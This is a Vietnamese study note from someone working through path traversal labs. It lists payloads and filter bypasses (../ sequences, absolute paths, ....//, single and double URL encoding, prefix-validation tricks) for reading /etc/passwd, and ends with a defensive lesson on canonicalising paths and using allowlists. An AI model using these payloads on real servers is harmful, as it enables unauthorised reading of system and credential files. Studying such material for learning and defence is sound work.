sau khi học phần này, mình hiểu là...
path traversal là chỗ server ghép input vào đường dẫn file.
không filter là đọc file hệ thống luôn.

- base case mình hay gặp:
-> `/loadImage?filename=218.png`
-> server đọc `/var/www/images/218.png`
-> mình chèn `../` để leo ra ngoài
- payload cơ bản:
-> `filename=../../../../etc/passwd`
-> đọc ra là thấy `root:x:0:0:...`
- absolute path bypass:
-> server chặn `../` nhưng quên chặn `/`
-> mình phang thẳng `filename=/etc/passwd`
-> không cần leo gì hết
- non-recursive strip bypass:
-> server strip `../` có 1 lần thôi
-> mình dùng `....//`
-> sau khi strip 1 lần
-> `....//` => `../`
-> payload: `filename=....//....//....//etc/passwd`
- encode bypass:
-> có chỗ server strip trước khi decode
-> mình encode `../` thành `%2e%2e%2f`
-> hoặc double encode `%252e%252e%252f`
-> server decode 2 lần là dính
- validate start-of-path bypass:
-> server bắt filename phải bắt đầu bằng `/var/www/images`
-> mình chiều nó luôn
-> `filename=/var/www/images/../../../etc/passwd`
-> qua check mà vẫn leo ra được

liên quan:
- file cũ [[path traversal]] nói ý tưởng gốc rồi
- lab mình làm:
-> [[Lab-Path traversal simple]]
-> [[Lab-Path traversal absolute bypass]]
-> [[Lab-Path traversal non-recursive strip]]
-> [[Lab-Path traversal encoded]]

> [!NOTE] bài học
> sau khi quan sát mấy lab mình thấy...
> filter kiểu blacklist là toang.
> nên mình chỉ tin whitelist + canonicalize.
> code chuẩn là `getCanonicalPath().startsWith(BASE_DIRECTORY)`.
> không ghép input trực tiếp vào `File()`.
